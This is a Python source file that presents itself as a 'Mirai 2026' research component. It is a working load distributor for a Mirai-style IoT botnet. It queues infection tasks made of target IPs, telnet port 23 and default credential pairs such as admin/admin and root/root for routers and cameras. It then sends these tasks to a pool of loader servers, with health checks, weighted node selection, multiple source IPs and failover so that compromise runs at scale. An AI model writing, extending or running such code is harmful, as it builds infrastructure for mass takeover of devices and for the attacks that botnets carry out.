#!/usr/bin/env python3
"""
Mirai 2026 - Load Distribution System

Distributes bot loading tasks across multiple loader nodes for scale.

Original Mirai architecture:
- 3x 10Gbps servers (loaders)
- Distributor spreads load evenly
- ~500 results/sec → immediate loading

This implementation:
- Round-robin load balancing
- Health checking for loader nodes
- Kubernetes HPA integration
- Metrics for distribution
- Automatic failover

@author Mirai 2026 Research Team
@date 2026-02-25
"""

import asyncio
import json
import logging
import time
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum
import aiohttp
from collections import deque

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class LoaderStatus(Enum):
    """Loader node health status"""
    HEALTHY = "healthy"
    DEGRADED = "degraded"
    UNHEALTHY = "unhealthy"
    UNKNOWN = "unknown"


@dataclass
class LoaderNode:
    """Represents a loader node"""
    host: str
    port: int
    name: str
    
    # Health metrics
    status: LoaderStatus = LoaderStatus.UNKNOWN
    last_check: float = 0.0
    consecutive_failures: int = 0
    
    # Load metrics
    active_connections: int = 0
    max_connections: int = 60000
    total_loads: int = 0
    successful_loads: int = 0
    failed_loads: int = 0
    
    # Performance metrics
    avg_response_time_ms: float = 0.0
    
    # Source IPs for multi-IP loading
    source_ips: List[str] = field(default_factory=list)
    
    @property
    def load_percentage(self) -> float:
        """Current load as percentage of capacity"""
        if self.max_connections == 0:
            return 100.0
        return (self.active_connections / self.max_connections) * 100
    
    @property
    def success_rate(self) -> float:
        """Success rate percentage"""
        if self.total_loads == 0:
            return 0.0
        return (self.successful_loads / self.total_loads) * 100
    
    @property
    def is_available(self) -> bool:
        """Check if node is available for loading"""
        return (self.status in [LoaderStatus.HEALTHY, LoaderStatus.DEGRADED] and
                self.active_connections < self.max_connections)
    
    @property
    def weight(self) -> float:
        """Calculate weight for weighted round-robin"""
        if not self.is_available:
            return 0.0
        
        # Weight based on:
        # - Available capacity (higher = better)
        # - Success rate (higher = better)
        # - Response time (lower = better)
        
        capacity_score = 1.0 - (self.load_percentage / 100)
        success_score = self.success_rate / 100
        
        # Response time score (inverse, capped at 1000ms)
        response_score = 1.0 - min(self.avg_response_time_ms / 1000, 1.0)
        
        # Weighted average
        weight = (capacity_score * 0.5 + success_score * 0.3 + response_score * 0.2)
        
        return max(weight, 0.01)  # Minimum weight


@dataclass
class LoadTask:
    """Represents a load task"""
    target_ip: str
    target_port: int
    username: str
    password: str
    device_type: Optional[str] = None
    timestamp: float = field(default_factory=time.time)


class Distributor:
    """
    Load distributor - spreads tasks across multiple loader nodes
    """
    
    def __init__(self, health_check_interval: int = 10):
        self.nodes: List[LoaderNode] = []
        self.task_queue: deque[LoadTask] = deque()
        self.health_check_interval = health_check_interval
        
        # Round-robin state
        self.current_node_index = 0
        
        # Statistics
        self.stats = {
            'total_tasks': 0,
            'distributed_tasks': 0,
            'failed_distributions': 0,
            'queue_length': 0,
        }
        
        # Health check task
        self.health_check_task: Optional[asyncio.Task] = None
        
        logger.info("Distributor initialized")
    
    def add_node(self, host: str, port: int, name: str, 
                 source_ips: List[str] = None, max_connections: int = 60000):
        """Add a loader node to the pool"""
        node = LoaderNode(
            host=host,
            port=port,
            name=name,
            source_ips=source_ips or [],
            max_connections=max_connections
        )
        self.nodes.append(node)
        logger.info(f"Added loader node: {name} at {host}:{port} "
                   f"(max_conn={max_connections}, source_ips={len(source_ips)})")
    
    async def check_node_health(self, node: LoaderNode) -> bool:
        """Check health of a single node"""
        url = f"http://{node.host}:{node.port}/health"
        
        try:
            start_time = time.time()
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    elapsed_ms = (time.time() - start_time) * 1000
                    
                    if resp.status == 200:
                        data = await resp.json()
                        
                        # Update metrics from health response
                        node.active_connections = data.get('active_connections', 0)
                        node.total_loads = data.get('total_loads', 0)
                        node.successful_loads = data.get('successful_loads', 0)
                        node.failed_loads = data.get('failed_loads', 0)
                        
                        # Update response time (exponential moving average)
                        if node.avg_response_time_ms == 0:
                            node.avg_response_time_ms = elapsed_ms
                        else:
                            node.avg_response_time_ms = (node.avg_response_time_ms * 0.8 + 
                                                         elapsed_ms * 0.2)
                        
                        # Determine status based on load
                        if node.load_percentage < 70:
                            node.status = LoaderStatus.HEALTHY
                        elif node.load_percentage < 90:
                            node.status = LoaderStatus.DEGRADED
                        else:
                            node.status = LoaderStatus.UNHEALTHY
                        
                        node.consecutive_failures = 0
                        node.last_check = time.time()
                        return True
                    else:
                        raise Exception(f"HTTP {resp.status}")
        
        except Exception as e:
            logger.warning(f"Health check failed for {node.name}: {e}")
            node.consecutive_failures += 1
            
            if node.consecutive_failures >= 3:
                node.status = LoaderStatus.UNHEALTHY
            elif node.consecutive_failures >= 1:
                node.status = LoaderStatus.DEGRADED
            
            node.last_check = time.time()
            return False
    
    async def health_check_loop(self):
        """Continuously check health of all nodes"""
        while True:
            try:
                await asyncio.sleep(self.health_check_interval)
                
                # Check all nodes concurrently
                tasks = [self.check_node_health(node) for node in self.nodes]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                healthy_count = sum(1 for r in results if r is True)
                total_count = len(self.nodes)
                
                logger.info(f"Health check: {healthy_count}/{total_count} nodes healthy")
                
                # Log node status
                for node in self.nodes:
                    logger.debug(
                        f"{node.name}: {node.status.value} - "
                        f"load={node.load_percentage:.1f}%, "
                        f"success={node.success_rate:.1f}%, "
                        f"response={node.avg_response_time_ms:.0f}ms"
                    )
            
            except Exception as e:
                logger.error(f"Health check loop error: {e}")
    
    def select_node_round_robin(self) -> Optional[LoaderNode]:
        """Select node using round-robin with health check"""
        if not self.nodes:
            return None
        
        # Try each node in order
        for _ in range(len(self.nodes)):
            node = self.nodes[self.current_node_index]
            self.current_node_index = (self.current_node_index + 1) % len(self.nodes)
            
            if node.is_available:
                return node
        
        return None
    
    def select_node_weighted(self) -> Optional[LoaderNode]:
        """Select node using weighted selection based on load/performance"""
        available_nodes = [n for n in self.nodes if n.is_available]
        if not available_nodes:
            return None
        
        # Calculate total weight
        total_weight = sum(n.weight for n in available_nodes)
        if total_weight == 0:
            return None
        
        # Weighted random selection
        import random
        rand_val = random.random() * total_weight
        cumulative = 0.0
        
        for node in available_nodes:
            cumulative += node.weight
            if rand_val <= cumulative:
                return node
        
        return available_nodes[-1]  # Fallback
    
    def select_node_least_loaded(self) -> Optional[LoaderNode]:
        """Select least loaded node"""
        available_nodes = [n for n in self.nodes if n.is_available]
        if not available_nodes:
            return None
        
        return min(available_nodes, key=lambda n: n.load_percentage)
    
    async def distribute_task(self, task: LoadTask, strategy: str = "weighted") -> bool:
        """
        Distribute a single task to a loader node
        
        Strategies:
        - round_robin: Simple round-robin
        - weighted: Weighted based on load/performance
        - least_loaded: Always pick least loaded node
        """
        self.stats['total_tasks'] += 1
        
        # Select node based on strategy
        if strategy == "round_robin":
            node = self.select_node_round_robin()
        elif strategy == "least_loaded":
            node = self.select_node_least_loaded()
        else:  # weighted (default)
            node = self.select_node_weighted()
        
        if not node:
            logger.warning("No available loader nodes for task")
            self.stats['failed_distributions'] += 1
            self.task_queue.append(task)
            self.stats['queue_length'] = len(self.task_queue)
            return False
        
        # Send task to loader
        url = f"http://{node.host}:{node.port}/load"
        payload = {
            'target_ip': task.target_ip,
            'target_port': task.target_port,
            'username': task.username,
            'password': task.password,
            'device_type': task.device_type,
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload, 
                                       timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        self.stats['distributed_tasks'] += 1
                        logger.info(f"Task distributed to {node.name}: {task.target_ip}:{task.target_port}")
                        return True
                    else:
                        raise Exception(f"HTTP {resp.status}")
        
        except Exception as e:
            logger.error(f"Failed to distribute task to {node.name}: {e}")
            self.stats['failed_distributions'] += 1
            
            # Queue for retry
            self.task_queue.append(task)
            self.stats['queue_length'] = len(self.task_queue)
            return False
    
    async def process_queue(self, strategy: str = "weighted", batch_size: int = 10):
        """Process queued tasks"""
        processed = 0
        
        while self.task_queue and processed < batch_size:
            task = self.task_queue.popleft()
            self.stats['queue_length'] = len(self.task_queue)
            
            await self.distribute_task(task, strategy)
            processed += 1
        
        return processed
    
    def get_stats(self) -> Dict:
        """Get distributor statistics"""
        healthy_nodes = sum(1 for n in self.nodes if n.status == LoaderStatus.HEALTHY)
        total_capacity = sum(n.max_connections for n in self.nodes)
        used_capacity = sum(n.active_connections for n in self.nodes)
        
        return {
            'nodes': {
                'total': len(self.nodes),
                'healthy': healthy_nodes,
                'degraded': sum(1 for n in self.nodes if n.status == LoaderStatus.DEGRADED),
                'unhealthy': sum(1 for n in self.nodes if n.status == LoaderStatus.UNHEALTHY),
            },
            'capacity': {
                'total': total_capacity,
                'used': used_capacity,
                'available': total_capacity - used_capacity,
                'utilization_pct': (used_capacity / total_capacity * 100) if total_capacity > 0 else 0,
            },
            'tasks': self.stats,
            'node_details': [
                {
                    'name': n.name,
                    'status': n.status.value,
                    'load_pct': n.load_percentage,
                    'success_rate': n.success_rate,
                    'response_time_ms': n.avg_response_time_ms,
                    'weight': n.weight,
                }
                for n in self.nodes
            ]
        }
    
    async def start(self):
        """Start the distributor (health checks)"""
        self.health_check_task = asyncio.create_task(self.health_check_loop())
        logger.info("Distributor started")
    
    async def stop(self):
        """Stop the distributor"""
        if self.health_check_task:
            self.health_check_task.cancel()
            try:
                await self.health_check_task
            except asyncio.CancelledError:
                pass
        logger.info("Distributor stopped")


# Example usage
async def main():
    """Example usage of distributor"""
    
    # Create distributor
    distributor = Distributor(health_check_interval=10)
    
    # Add loader nodes (example - replace with actual nodes)
    distributor.add_node(
        host="loader1.example.com",
        port=8000,
        name="loader-1",
        source_ips=["192.168.1.100", "192.168.1.101"],
        max_connections=60000
    )
    
    distributor.add_node(
        host="loader2.example.com",
        port=8000,
        name="loader-2",
        source_ips=["192.168.1.102", "192.168.1.103"],
        max_connections=60000
    )
    
    distributor.add_node(
        host="loader3.example.com",
        port=8000,
        name="loader-3",
        source_ips=["192.168.1.104", "192.168.1.105"],
        max_connections=60000
    )
    
    # Start health checks
    await distributor.start()
    
    # Distribute some example tasks
    tasks = [
        LoadTask("192.168.1.1", 23, "admin", "admin", "router"),
        LoadTask("192.168.1.2", 23, "root", "root", "router"),
        LoadTask("192.168.1.3", 23, "admin", "password", "camera"),
    ]
    
    for task in tasks:
        await distributor.distribute_task(task, strategy="weighted")
    
    # Print stats
    print("\n=== Distributor Statistics ===")
    stats = distributor.get_stats()
    print(json.dumps(stats, indent=2))
    
    # Stop
    await distributor.stop()


if __name__ == "__main__":
    asyncio.run(main())
